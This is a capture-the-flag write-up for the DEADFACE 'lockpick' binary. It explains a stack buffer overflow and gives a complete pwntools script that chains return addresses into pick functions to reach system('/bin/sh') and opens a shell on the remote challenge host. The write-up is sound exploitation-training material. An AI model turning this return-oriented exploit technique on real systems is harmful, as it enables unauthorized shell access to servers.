We found this program on one of the old drives DEADFACE threw out. We think they’re using it on a server somewhere as a way for members to ‘log in…' and to keep other people out.
No password seems to work. Looking it over, it seems vulnerable enough-- but how on earth do you open a lock with no key?

---
for this challenge we have a linux binary, that asks user for a password.
```bash
$ ./lockpick
PROGRAM SECURED...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠟⠉⠀⠀⠀⠈⠙⠿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠉⠉⠉⠀⠀
How do you open a lock with no key?
password
Trying to unlock...
darn, not the right order...
```
this binary has
- no PIE
- NX enabled
- no canary

disassembly of the main function (binary ninja):
```C
{
    setbuf(__TMC_END__, nullptr);
    vuln();
    puts("Trying to unlock...");
    
    if (pin1 != 1 || pin2 != 1 || pin3 != 1 || pin4 != 1 || pin5 != 1)
        puts("darn, not the right order...");
    else
        system("/ghh/op");
    
    return 0;
}
```

- pin1 .. pin5 are global variables. 
- we have functions in our program called `pick1()` .. `pick5()` that has code to set `pin1` .. `pin5` to 1.
- these function also change the "/ghh/op" string to "/bin/sh".

if we can jump to these functions in order
- they will change the "/ghh/op" string to "/bin/sh"
- satisfy the condition to call system("/bin/sh")

we are dividing the payload into 2 parts because `system` has instruction which deals with xmm register and requires that the stack is 16 byte aligned, and jumping to middle of function multiple times messed up the alignment for me.

final payload:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./lockpick")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
script = '''
set disassembly-flavor intel
break vuln
display/5i $rip
display/30xg $rsp
display/x $rdi
display/x $rsi
display/x $rdx
display/x $rcx
'''

def conn():
    if args.L:
        r = process([exe.path])
        if args.GDB:
            return gdb.debug(exe.path, gdbscript=script)
    else:
        r = remote("env01.deadface.io",9999)

    return r


def main():
    r = conn()
    offset = cyclic_find(0x6161617461616173)

    payload = [
            b'a'*offset,
            p64(0x0040127c), # after if condition in pick1
            p64(0xdeadbeef), # compensate for pop rbp
            p64(0x004012c1), # after if condition in pick2
            p64(0xdeadbeef), # compensate for pop rbp
            p64(0x00401314), # after if condition in pick3
            p64(0xdeadbeef), # compensate for pop rbp
            p64(0x0040133f), # after if condition in pick4
            p64(0xdeadbeef), # compensate for pop rbp
            p64(exe.sym['main']) # call main again.
            ]
    payload = b''.join(payload)
    r.sendline(payload)

    payload = [
            b'a'*offset,
            p64(0x00401384), # after if condition in pick4
            p64(0xdeadbeef), # compensate for pop rbp
            p64(exe.sym['main'])
            ]
    payload = b''.join(payload)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

```

